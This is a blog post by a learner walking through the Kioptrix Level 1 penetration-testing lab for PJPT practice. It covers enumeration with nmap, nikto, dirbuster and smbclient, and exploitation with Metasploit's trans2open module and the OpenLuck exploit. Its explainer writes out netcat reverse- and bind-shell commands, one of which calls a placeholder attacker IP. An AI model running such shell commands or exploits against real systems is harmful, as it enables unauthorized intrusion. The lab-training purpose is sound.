---
layout: post
title: TCM - practice for Kioptrix Lab
subtitle: Preparing for PJPT (Practical Junior Penetration Tester) certification by walking through Kioptrix lab - level1
tags: [ethical hacking, tcm, pjpt, kioptrix, utm, level1]
comments: true
author: Lantana Park
---

# Kioptrix Lab (Level 1)

## Preparation

As an UTM user, it was really hard to install kioptrix lab in my utm machine at first. Thankfully, TCM has been providing `.7z` converted file for the UTM users. I did just follow the given resources from TCM discord.

1. Downloaded `Kioptrix_utm.7z`

   ![download](../assets/img/kioptrix/Screenshot%202024-06-26%20at%2023.25.03.png)

2. Extracted the contents of this compressed file. `7zz x Kioptrix_utm.7z`

   ![decompressed1](../assets/img/kioptrix/Screenshot%202024-06-26%20at%2023.16.56.png)

   ![decompressed2](../assets/img/kioptrix/Screenshot%202024-06-26%20at%2023.17.12.png)

3. Installed the decompressed file on my UTM machine

   ![install](../assets/img/kioptrix/Screenshot%202024-06-26%20at%2023.29.38.png)

4. Ran the target(victim) machine and then tested the network connection using `ping 8.8.8.8` (google dns ip address)

   ![test](../assets/img/kioptrix/Screenshot%202024-06-26%20at%2022.52.38.png)

5. While running up on the Kioptrix lab, found the victim's ip address on my kali machine and then scanned the opened ports(services) of target machine.

   `netdiscover -r 192.168.64.0/24` for discovering lab's networking

   ![labnetworking](../assets/img/kioptrix/Screenshot%202024-06-26%20at%2022.52.55.png)

   `nmap -T4 -p- -A 192.168.64.15` for scanning ports of the victim machine from Kali (attacker)

   ![scanning1](../assets/img/kioptrix/Screenshot%202024-06-26%20at%2022.53.07.png)

   ![scanning2](../assets/img/kioptrix/Screenshot%202024-06-26%20at%2022.53.18.png)

## Scanning/Enumeration

### a trivial tip from class!

What sets me apart from other people is my ability to gather information and enumerate targets. In my opinion, in order to collect valuable information, it is necessary for me to learn more about the networking processes of each popular protocol.

1. First, visited the opened websites under `http`/`https` based on the outcomes of the `nmap` scan.

   ![website1](../assets/img/kioptrix/Screenshot%202024-06-27%20at%2015.27.48.png)

   ![website2](../assets/img/kioptrix/Screenshot%202024-06-27%20at%2015.27.59.png)

   ![website3](../assets/img/kioptrix/Screenshot%202024-06-28%20at%2009.24.38.png)

Noted information

`80(http)/443(https) - 192.168.64.15`
`80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4`
`443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4`
`Default webpage - Apache Web Server/1.3.20 (Unix) - PHP`
`Document - https://192.168.64.15/manual/index.html Not Found - Apache/1.3.20`

Potential vulnerabilities

Apache httpd 1.3.20 - Root directory access

- https://www.exploit-db.com/exploits/19975
- https://httpd.apache.org/security/vulnerabilities_13.html
- https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-66/version_id-371592/Apache-Http-Server-1.3.20.html?page=1&cvssscoremin=8&order=1&trc=8&sha=6d26d89b3754eda3acf4098d3cc8bf718f8405f6

2. noticing there are websites running under `http` and `https`, scanned the vulnerability of these services. could not scan the `https` service, but was able to scan potential vulnerabilities `http` service using `nikto`. (Enumeration HTTP and HTTPS)

   `nikto -h http://192.168.64.15`

   `nikto` is to examine a web server to find potential problems and security vulnerabilities.

   `-h` option is to specify the host `http://192.168.64.15`,
   `https://192.168.64.15 `.

   ![vulnerability](../assets/img/kioptrix/Screenshot%202024-06-27%20at%2015.42.24.png)

   ![vulnerability2](../assets/img/kioptrix/Screenshot%202024-06-27%20at%2015.42.46.png)

Noted information

`mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell.`

### What is mod_ssl?

It is an Apache HTTP Server module that provided support for secure communication over HTTP and HTTPS. Since 2.8.4 and 2.8.7 are really older versions of `mod_ssl`, I found common vulnerabilities by googling it.

Potential vulnerabilities

(80/443) - `mod_ssl/2.8.4` - OpenLuck (remote buffer overflow for remote shell - CVE-2002-0082)

- https://www.exploit-db.com/exploits/47080
- https://github.com/heltonWernik/OpenLuck

Again, I searched potential vulnerabilities with `searchsploit` and then focused on remote buffer overflow exploitation.
![searchsploit](../assets/img/kioptrix/Screenshot%202024-07-01%20at%2012.48.15.png)

### What is the buffer overflow attack?

In computer science, a data buffer temporarily holds data as it moves between locations, like from an input to an output device, and helps manage varying processing rates, typically using RAM for its quick access speed. Buffers often use queue algorithms (First In First Out) to balance timing, writing data at one speed and reading it at another.

Attackers can exploit the buffer overflows to corrupt a web application's execution stack, taking advantage of user's input, if the data storage space is fixed. There are two types of the buffer overflow attack: **stack-based buffer overflow** and **heap-based buffer overflow**.

3. Scanned hidden directories of this service with using `dirbuster`. (Enumeration HTTP and HTTPS)

   ![dirbcommand](../assets/img/kioptrix/Screenshot%202024-06-28%20at%2011.54.34.png)

   ![dirbcommand2](../assets/img/kioptrix/Screenshot%202024-06-28%20at%2011.54.44.png)

   ![dirb1](../assets/img/kioptrix/Screenshot%202024-06-28%20at%2011.12.35.png)

   ![dirb2](../assets/img/kioptrix/Screenshot%202024-06-28%20at%2011.13.04.png)

   And visited some hidden directories

   ![visited2](../assets/img/kioptrix/Screenshot%202024-06-28%20at%2011.13.26.png)

   ![visited1](../assets/img/kioptrix/Screenshot%202024-06-28%20at%2011.46.39.png)

   ![visited3](../assets/img/kioptrix/Screenshot%202024-06-28%20at%2011.43.29.png)

   ![chart1](../assets/img/kioptrix/Screenshot%202024-06-28%20at%2012.12.56.png)

   ![chart2](../assets/img/kioptrix/Screenshot%202024-06-28%20at%2011.41.47.png)

   ![chart3](../assets/img/kioptrix/Screenshot%202024-06-28%20at%2011.42.05.png)

   Noted information

   `192.168.64.15/usage/usage_202406.html - Generated by Webalizer Version 2.01`

   ### What is webalizer?

   It is **a web log analysis software tool**. It has multiple cross-site scripting vulnerabilities that could allow malicious HTML tags to be injected in the reports.

   Potential vulnerabilities

   `192.168.64.15/usage/usage_202406.html` - multi cross-site scripting vulnerabilities or remote buffer overflow

   - https://www.tenable.com/plugins/nessus/10816 (cross-site scripting)
   - https://www.cvedetails.com/cve/CVE-2002-0180/ (remote buffer overflow)
   - https://cve.mitre.org/cgi-bin/cvename.cgi?name=2002-0180 (remote buffer overflow)

4. Scanned the target for SMB protocol enumeration.

   I used `matasploit` to identify the version of SMB protocol

   entered with `metasploit` tool

   ![msfconsole](../assets/img/kioptrix/Screenshot%202024-07-01%20at%2009.42.39.png)

   ![msfconsole2](../assets/img/kioptrix/Screenshot%202024-07-01%20at%2009.42.45.png)

   Searched auxiliaries of the SMB protocol for scanning its version

   ![search](../assets/img/kioptrix/Screenshot%202024-07-01%20at%2017.26.03.png)

   ![outcomes](../assets/img/kioptrix/Screenshot%202024-07-01%20at%2017.26.03.png)

   Got the info to use this auxiliary for scanning the target smb protocol

   ![info1](../assets/img/kioptrix/Screenshot%202024-07-01%20at%2017.24.28.png)

   ![info2](../assets/img/kioptrix/Screenshot%202024-07-01%20at%2017.24.41.png)

   Set RHOST(the target ip) to exploit

   ![rhost](../assets/img/kioptrix/Screenshot%202024-07-01%20at%2017.24.59.png)

   Furthermore, I used `smbclient` to check the shared resources on the server that uses the `SMB` protocol. In fact, I just approached this protocol in order to ensure that it is indeed inaccessible for now.

   ![smbclient](../assets/img/kioptrix/Screenshot%202024-07-01%20at%2018.16.11.png)

   I found that `IPC$` can be accessible without the password input.

   ![smbclient2](../assets/img/kioptrix/Screenshot%202024-07-01%20at%2010.01.09.png)

   Noted information

   `139 / tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)`

   `Host script results:`

   `|_smb2-time: Protocol negotiation failed (SMB2)`

   `|_clock-skew: -3d05h31m10s`

   `|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)`

   `Unix (Samba 2.2.1.a)`

   `IPC$ is accessible using smbclient with no password input`

   ### What is **SMB**(139 or 445 ports)?

   It is for providing shared access to files, printers, and serial ports between nodes on a network. And this protocol allows applications on a computer to read and write to files and to request services from server programs in a computer network. The popular vulnerability using this protocol is **EternalBlue**.

   ### What is samba?

   SMB is a protocol used for network communication, defining how data is transmitted and accessed over a network. Samba, on the other hand, is software that implements SMB protocols on Unix-like systems, enabling these systems to share files, directories, and printers with various client environments.

   Potential vulnerabilities

   (139)`Samba 2.2.1a` - Remote Buffer Overflow (tran2open)

   - https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/
   - https://www.exploit-db.com/exploits/22468

5. Made some tries to login the target ssh without login.

   ### What is SSH(Secure Shell) protocol?

   It is to access a computer over unsecure network. It provides strong password authentication and public authentication, as well as encrypted data communication between two computers. It is widely used for managing servers and network devices securely.

   ![ssh1](../assets/img/kioptrix/Screenshot%202024-07-01%20at%2018.26.08.png)

   **Key exchange algorithms** in `SSH` is to enable the secure negotiation and derivation of a shared session key. This session key, in turn, are used to encrypt data, ensuring confidentiality and integrity throughout the SSH session.

   **Host key algorithms** is to tell the SSH client to accept these specific types of host key algorithms from server. In short, it is to verify the authenticity of the SSH server they are connecting to.

   **ciphers** is used to encrypt and decrypt data transmitted between the client and server. Once the session keys are derived, the keys are used by the symmetric encryption ciphers (like AES) to encrypt data transmitted between the client and server. Each SSH session uses its own session keys for encrypting and decrypting the data exchanged during that session

   Noted information

   `22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)`
   `Still not accessible with no password`

   Potential vulnerabilities

   `OpenSSH 2.9p2` - Token Buffer Overflow

   - https://www.exploit-db.com/exploits/21402

   ![potential](../assets/img/kioptrix/Screenshot%202024-07-01%20at%2018.30.05.png)

## Scanning with Nessus

There was a tool called `Nessus` that comprehensively scans vulnerabilities on the target machine. With this nice tool, I could perform brute-force attacks using `hydra` though, it is possible to do the web application scans, and perform TCP, SYN, and UDP scans.

Here is the steps to use this service.

1. Downloaded/installed the file.

   I selected `aarch64`, instead of `amd`, because I am using M1 mac os.

   ![failed](../assets/img/kioptrix/Screenshot%202024-07-02%20at%2011.59.04.png)

   ![aarch64Selection](../assets/img/kioptrix/Screenshot%202024-07-02%20at%2012.03.14.png)

   ![successDownload](../assets/img/kioptrix/Screenshot%202024-07-02%20at%2011.59.15.png)

   ![successDownload2](../assets/img/kioptrix/Screenshot%202024-07-02%20at%2011.59.29.png)

2. Selected Basic scan and set the scanning configuration

   ![setting1](../assets/img/kioptrix/Screenshot%202024-07-02%20at%2011.05.30.png)

   ![setting2](../assets/img/kioptrix/Screenshot%202024-07-02%20at%2011.06.54.png)

   ![setting3](../assets/img/kioptrix/Screenshot%202024-07-02%20at%2011.07.32.png)

   ![setting4](../assets/img/kioptrix/Screenshot%202024-07-02%20at%2011.08.06.png)

   ![setting5](../assets/img/kioptrix/Screenshot%202024-07-02%20at%2011.12.20.png)

3. From now on, I am going to use these scanned potential vulnerabilities during the exploitation phase.

   ![setting6](../assets/img/kioptrix/Screenshot%202024-07-02%20at%2012.12.50.png)

   ![setting7](../assets/img/kioptrix/Screenshot%202024-07-02%20at%2012.12.20.png)

## Exploitation

### What is (netcat) reverse shell?

**The target(victim) is connecting to the attack box that is listening.** That means attacker's machine should be a server and a victim should be a client. An attacker opens up a port for communication and waits for incoming connection from the victim.

`nc -lvnp 7777` (attacker's machine) opening port from attacker

TCP connection port 7777

`nc [attacker_ip] 7777 -e /bin/bash` (victim's machine) connecting to the attacker's opened port

### What is (netcat) bind shell?

**The attacker connects to a listening port on the victim's machine.** Attacker's machine should be a client and the victim's machine should be server. So a victim opens up a port and waits for the client(attacker) to connect to the opened port. So attacker can make commands remotely on the victim's machine.

`nc -lvnp 7777 -e /bin/bash` (victim's machine) On the victim's machine, the attacker would typically execute a command for connection

TCP connection port 7777

`nc [victim_ip] 7777` (attacker's machine) opening port

### What is a payload?

It is the part of the exploit code that performs the actions desired by the attacker.

### What is staged payloads (particularly in `metasploit` framework)?

A stage payload sends the exploit shell code in multiple stages. Initially, a small staged payloads is sent to the target machine, which then establishes a connection back to the attacker's machine and downloads the larger staged payloads that contains the actual exploit code. It requires a stable connection in multiple stages. If the connection is interrupted, the exploitation will be incomplete.

Example,

`windows/meterpreter_reverse_tcp`
`linux/x64/meterpreter_reverse_tcp`

### What is non-staged payloads (particularly in `metasploit` framework)?

The entire payload is sent to the target machine in one go. This payload contains all the necessary code to exploit the target and establish a session. The payload is executed on the target machine, providing the attacker with the desired shell or access. It is more stable because it does not require to maintain the connection for multiple stages. However, the payload is larger, which can make it more difficult to deliver successfully and potentially easier to detect.

Example,

`windows/meterpreter/reverse_tcp`
`linux/x64/meterpreter/reverse_tcp`

I have to choose between using the staged and non-staged payloads depends on several factors, including network connection stability, the target environment, the payload size, and requirements of penetrating test.

1. `139 - SMB exploitation (trans2open)`

   First, I used the `metasploit` to exploit the vulnerabilities of `Samba 2.2.1a`

   Running `msfconsole` in order to use `metasploit`

   ![running](../assets/img/kioptrix/Screenshot%202024-07-03%20at%2010.07.00.png)

   Searching modules to exploit the `trans2open`

   ![selecting](../assets/img/kioptrix/Screenshot%202024-07-03%20at%2010.07.17.png)

   Selecting the proper module to exploit it. Samba is an implementation of the SMB protocol for Unix-like systems. And `Linux` is often included under the umbrella term "Unix-like" operating systems. Thus I selected `exploit/linux/samba/trans2open`

   ![selecting2](../assets/img/kioptrix/Screenshot%202024-07-03%20at%2010.06.48.png)

   https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/

   For now, no payload configured and `linux/x86/meterpreter/reverse_tcp` will be run as default

   Setting the RHOSTS (target machine)

   ![selecting3](../assets/img/kioptrix/Screenshot%202024-07-03%20at%2010.06.16.png)

   Trying to run, but failed...

   ![running](../assets/img/kioptrix/Screenshot%202024-07-03%20at%2013.33.21.png)

   Setting manually possible payload `linux/x86/shell_reverse_tcp` because linux on x86 architecture is widely deployed across various environments and reverse TCP shell establishes a reverse TCP connection back to the attacker's machine. (Because it is widely used payload)

   ![settingpayload](../assets/img/kioptrix/Screenshot%202024-07-03%20at%2013.50.46.png)

   ![settingpayload2](../assets/img/kioptrix/Screenshot%202024-07-03%20at%2010.05.55.png)

   ![settingpayload3](../assets/img/kioptrix/Screenshot%202024-07-03%20at%2013.51.11.png)

   ![settingpayload4](../assets/img/kioptrix/Screenshot%202024-07-03%20at%2010.05.04.png)

   Obtained root authentication

2. `80, 443 - mod_ssl/2.8.4 (OpenLuck)`

   resourced from https://github.com/heltonWernik/OpenLuck

   ![gitclone](../assets/img/kioptrix/Screenshot%202024-07-03%20at%2014.12.29.png)

   ![ls](../assets/img/kioptrix/Screenshot%202024-07-03%20at%2014.12.38.png)

   ![installinglibrary](../assets/img/kioptrix/Screenshot%202024-07-03%20at%2014.12.52.png)

   ![compile](../assets/img/kioptrix/Screenshot%202024-07-03%20at%2014.13.01.png)

   ![run1](../assets/img/kioptrix/Screenshot%202024-07-03%20at%2014.13.41.png)

   ![run2](../assets/img/kioptrix/Screenshot%202024-07-03%20at%2014.14.09.png)

   ![firstTry](../assets/img/kioptrix/Screenshot%202024-07-03%20at%2018.58.03.png)

   ![final1](../assets/img/kioptrix/Screenshot%202024-07-03%20at%2014.14.49.png)

   ![final2](../assets/img/kioptrix/Screenshot%202024-07-03%20at%2014.14.36.png)
